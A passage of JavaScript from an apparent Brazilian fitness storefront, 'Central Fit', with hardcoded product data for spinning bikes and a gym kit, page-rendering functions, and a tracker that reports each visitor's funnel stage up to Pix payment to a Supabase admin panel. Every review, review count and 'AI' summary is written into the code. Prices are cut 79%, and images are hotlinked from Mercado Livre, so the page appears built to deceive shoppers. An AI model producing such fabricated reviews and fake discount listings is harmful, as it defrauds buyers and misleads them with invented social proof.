      specs: [['Roda de inércia', '15 kg'], ['Conectividade', 'App via Bluetooth'], ['Resistência', 'Por fricção'], ['Selim', 'Ajustável'], ['Guidão', 'Ajustável'], ['Peso suportado', '150 kg'], ['Uso indicado', 'Doméstico/Profissional'], ['Pedal', 'Com clip e plataforma']],
      desc: 'Bicicleta spinning profissional com roda de inércia de 15 kg para treinos intensos. Conectividade via app Bluetooth para monitorar desempenho em tempo real. Suporta até 150 kg, selim e guidão totalmente ajustáveis, pedal duplo com clip e plataforma. Ideal para quem busca performance em casa.',
      reviewMeta: { count: '1.043', ai: 'Excelente para treinos intensos. Roda de 15kg garante pedalada fluida e realista. Conectividade com app é diferencial. Produto robusto e estável, supera expectativas pelo preço.' },
      reviews: [
        { rate: 5, name: 'Gustavo P.', country: 'Brasil', when: 'Há 1 mês', ageDays: 28, likes: 112,
          text: 'Perfeita! A roda de 15kg faz toda a diferença no treino. O app conecta fácil e monitora tudo. Vale cada centavo.' },
        { rate: 5, name: 'Aline C.', country: 'Brasil', when: 'Há 2 meses', ageDays: 65, likes: 89,
          text: 'Produto incrível. Estável, silenciosa e o pedal com clip é excelente. O app funciona bem e motiva a treinar mais.' },
        { rate: 5, name: 'Rodrigo M.', country: 'Brasil', when: 'Há 3 meses', ageDays: 88, likes: 57,
          text: 'Superei minhas expectativas. A qualidade é muito boa para o preço. Monto treinos de 1h por dia sem qualquer problema.' }
      ] },
    31: { name: 'Brus Fit Bicicleta Ergométrica Spinning Liftness X11 Preto/Vermelho',
      img: 'https://http2.mlstatic.com/D_NQ_NP_775996-MLA116732133503_082026-O.webp',
      p: '80,00', old: '380,00', off: '79% OFF', vars: null,
      specs: [['Marca', 'Brus Fit'], ['Modelo', 'Liftness X11'], ['Cor', 'Preto/Vermelho'], ['Resistência', 'Por fricção'], ['Selim', 'Ajustável'], ['Guidão', 'Ajustável'], ['Peso suportado', '130 kg'], ['Roda de inércia', 'Pesada']],
      desc: 'Bicicleta spinning Brus Fit Liftness X11 em preto e vermelho com design esportivo e estrutura robusta. Resistência por fricção ajustável para simular diferentes intensidades. Selim e guidão ajustáveis para se adaptar a qualquer estatura. Ideal para cardio e queima de gordura em casa.',
      reviewMeta: { count: '523', ai: 'Design bonito e estrutura sólida. Boa para treinos regulares em casa. Montagem simples e acabamento de qualidade. O vermelho com preto valoriza o ambiente de treino.' },
      reviews: [
        { rate: 5, name: 'Tatiane B.', country: 'Brasil', when: 'Há 1 mês', ageDays: 25, likes: 68,
          text: 'Amei o design! Chegou bem embalada, fácil de montar. Está firme e silenciosa. Já uso todo dia há 3 semanas.' },
        { rate: 5, name: 'Leonardo O.', country: 'Brasil', when: 'Há 2 meses', ageDays: 60, likes: 45,
          text: 'Produto de ótima qualidade. Estrutura firme, não range. A cor vermelha é linda. Vale muito o investimento.' },
        { rate: 4, name: 'Patricia N.', country: 'Brasil', when: 'Há 1 mês', ageDays: 40, likes: 22,
          text: 'Boa bicicleta para o valor. Montagem tranquila com o manual. Uso 3x por semana e está ótima até agora.' }
      ] },
    27: { name: 'Kit Completo Academia Fitness Profissional 4 Peças Preto',
      img: 'https://http2.mlstatic.com/D_NQ_NP_955068-MLA107832494564_032026-O-kit-completo-academia-fitness-profissional-4-pecas-preto.webp',
      p: '88,00', old: '420,00', off: '79% OFF', vars: null,
      specs: [['Peças incluídas', '4'], ['Cor', 'Preto'], ['Uso indicado', 'Doméstico/Profissional'], ['Material', 'Aço'], ['Tipo', 'Musculação'], ['Montagem', 'Simples'], ['Acabamento', 'Pintado'], ['Design', 'Compacto']],
      desc: 'Kit completo para academia fitness profissional com 4 peças na cor preto. Conjunto versátil para treinos em casa com acabamento resistente e design compacto. Ideal para montar sua academia pessoal com equipamentos de qualidade profissional.',
      reviewMeta: { count: '5', ai: 'Kit bem avaliado pelos compradores. Acabamento excelente, suportes resistentes e montagem simples. Ótimo para quem deseja montar academia em casa.' },
      reviews: [
        { rate: 5, name: 'Tatiana F.', country: 'Brasil', when: 'Há 4 meses', ageDays: 120, likes: 30,
          text: 'Eu adorei e já irei iniciar meus treinos esse final de semana. Chegou muito bem embalado e a qualidade é excelente! Recomendo para todo mundo.' },
        { rate: 5, name: 'Anderson C.', country: 'Brasil', when: 'Há 3 meses', ageDays: 90, likes: 13,
          text: 'Suportes muito bons, acabamentos excelentes! Recomendo para quem quer montar academia em casa sem gastar muito.' },
        { rate: 5, name: 'Débora M.', country: 'Brasil', when: 'Há 2 meses', ageDays: 65, likes: 10,
          text: 'Produto top, entrega rápida e bem embalado. O kit é completo e de boa qualidade. Estou muito satisfeita com a compra.' },
        { rate: 5, name: 'Felipe R.', country: 'Brasil', when: 'Há 3 meses', ageDays: 85, likes: 8,
          text: 'Ótimo custo-benefício! Fácil de montar, sólido e resistente. Perfeito para treinar em casa sem precisar ir à academia.' },
        { rate: 4, name: 'Sandra L.', country: 'Brasil', when: 'Há 1 mês', ageDays: 32, likes: 5,
          text: 'Gostei bastante do produto. Chegou no prazo e bem embalado. Acabamento bom, estou usando todo dia nos treinos.' }
      ] }
  };

  function _specsTable(specs) {
    const half = Math.ceil(specs.length / 2);
    const rows = arr => arr.map(s => `<tr><th scope="row">${esc(s[0])}</th><td>${esc(s[1])}</td></tr>`).join('');
    return `<div class="specs">
      <div class="specs__col"><h3>Características principais</h3><table class="spec-table"><caption class="sr">Características principais</caption><tbody>${rows(specs.slice(0, half))}</tbody></table></div>
      <div class="specs__col"><h3>Outras características</h3><table class="spec-table"><caption class="sr">Outras características</caption><tbody>${rows(specs.slice(half))}</tbody></table></div>
    </div>`;
  }

  function applyProduct(prod) {
    const priceNum = Number(prod.p.replace(/\./g, '').replace(',', '.'));
    const oldNum = Number(prod.old.replace(/\./g, '').replace(',', '.'));
    const unit = (priceNum / 12).toFixed(2).replace('.', ',');

    document.title = prod.name + ' | Central Fit';
    const h1 = $('.title'); if (h1) h1.textContent = prod.name;

    /* galeria: imagem única do produto (voltagem não troca a foto) */
    activeGallery = [_im(prod.img, prod.name)];
    COLOR_GALLERIES = {};
    (prod.vars || []).forEach(v => { COLOR_GALLERIES[v] = activeGallery; });
    rebuildThumbs();

    /* preço */
    const amt = $('.price__now .amount'); if (amt) amt.innerHTML = supPrice(prod.p);
    const po = $('.price__old'); if (po) po.innerHTML = '<span class="sr">Preço antigo: </span>' + supPrice(prod.old);
    const pf = $('.price__off'); if (pf) pf.textContent = prod.off;
    const pu = $('.price__unit'); if (pu) pu.textContent = 'ou em até 12x de R$ ' + unit + ' sem juros no cartão';
    const bo = $('.buy-opt.is-sel');
    if (bo) {
      bo.dataset.pix = priceNum.toFixed(2);
      const ba = $('.buy-opt__price .amount', bo); if (ba) ba.innerHTML = supPrice(prod.p);
      const bold = $('.buy-opt__old', bo); if (bold) bold.innerHTML = '<span class="sr">Preço antigo: </span>R$ ' + prod.old;
      const boff = $('.off', bo); if (boff) boff.textContent = prod.off;
    }
    OLD_UNIT = oldNum; PRODUCT = prod.name; PRODUCT_NAME_FULL = prod.name; PRODUCT_ID = 'CF_' + prod.id;

    /* características, destaques e descrição */
    const sf = $('#specFade'); if (sf) sf.innerHTML = _specsTable(prod.specs);
    const stg = $('#specsToggle'); if (stg) stg.hidden = true;
    const hi = $('.specs-hi ul'); if (hi) hi.innerHTML = prod.specs.slice(0, 6).map(s => `<li><b>${esc(s[0])}:</b> ${esc(s[1])}</li>`).join('');
    const de = $('#desc'); if (de) de.textContent = prod.desc;

    /* variantes (voltagem) — ou some se o produto não tiver */
    const vs = $('.var-selectors');
    if (vs) {
      if (prod.vars && prod.vars.length) {
        const lb = $('#varVoltLabel'); if (lb) lb.textContent = prod.vars[0];
        const op = $('#varVoltOpts');
        if (op) op.innerHTML = prod.vars.map((v, i) => `<button type="button" class="var-btn${i ? '' : ' is-sel'}" data-label="${esc(v)}" aria-pressed="${i ? 'false' : 'true'}">${esc(v)}</button>`).join('');
        vs.hidden = false;
      } else {
        vs.hidden = true;
      }
    }

    /* "Fotos do produto" tem fotos específicas da LAV1300 → esconde em outros produtos */
    const _ph = document.getElementById('photos');
    if (_ph) { const sec = _ph.closest('section'); if (sec) sec.hidden = true; }

    if (typeof updateCheckout === 'function') { try { updateCheckout(); } catch (_) {} }

    /* troca opiniões, contagem e resumo IA pelo conteúdo do produto */
    if (prod.reviewMeta) { _revCount = prod.reviewMeta.count; _revAI = prod.reviewMeta.ai; }
    if (prod.reviews && prod.reviews.length) {
      REVIEWS = prod.reviews;
      showAll = false; rateFilter = 0; sortMode = 'rel';
      renderReviews();
    }

    window.scrollTo(0, 0);
  }

  const _qid = new URLSearchParams(location.search).get('id');
  if (_qid && PRODUCTS[_qid]) { PRODUCTS[_qid].id = _qid; applyProduct(PRODUCTS[_qid]); }

  /* ============ Presença ao vivo no painel admin (visitor_presence) ============
     O dashboard agrupa os visitantes dos últimos 90s por etapa do funil.
     Aqui a etapa é dinâmica: home / product / checkout / pix. */
  (function presenceAdmin() {
    const SB_P = 'https://dswawxckvmzftxumtdad.supabase.co';
    const KEY_P = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRzd2F3eGNrdm16ZnR4dW10ZGFkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk2MDIzNjUsImV4cCI6MjEwNTE3ODM2NX0.0Lnq6WdrFxntke23WZM-2mzAbb9z36PrOTr2eWMN9RM';

    let sid = '';
    try {
      sid = sessionStorage.getItem('plt-sid') || '';
      if (!sid) {
        sid = (crypto.randomUUID ? crypto.randomUUID() : (Date.now().toString(36) + Math.random().toString(36).slice(2)));
        sessionStorage.setItem('plt-sid', sid);
      }
    } catch (_) { sid = 'anon-' + Date.now().toString(36); }

    function currentCat() {
      try {
        if (doneView && !doneView.hidden) return 'pix';
        if (cho && !cho.hidden) return 'checkout';
      } catch (_) {}
      const id = new URLSearchParams(location.search).get('id');
      return (!id || id === '5') ? 'home' : 'product';
    }

    let lastCat = null;
    function ping() {
      /* Aba escondida não conta como "visitante ao vivo". Sem esta guarda, quem
         abria o checkout e trocava de app seguia pingando (o navegador estrangula
         o timer para ~1x/min, mas não o mata) e ficava preso no contador para
         sempre — com a campanha desligada o painel ainda marcava "Checkout: 1".
         Parando de pingar, a sessão sai sozinha da janela de 90s. */
      if (document.hidden) return;
      lastCat = currentCat();
      fetch(SB_P + '/rest/v1/visitor_presence', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          apikey: KEY_P,
          Authorization: 'Bearer ' + KEY_P,
          Prefer: 'resolution=merge-duplicates'
        },
        body: JSON.stringify({ session_id: sid, page_category: lastCat, last_seen: new Date().toISOString() }),
        keepalive: true
      }).catch(() => {});
    }

    ping();
    setInterval(ping, 20000);                                   // heartbeat
    setInterval(() => { if (currentCat() !== lastCat) ping(); }, 1500);  // muda de etapa → avisa na hora
    document.addEventListener('visibilitychange', () => { if (!document.hidden) ping(); });
  })();
})();
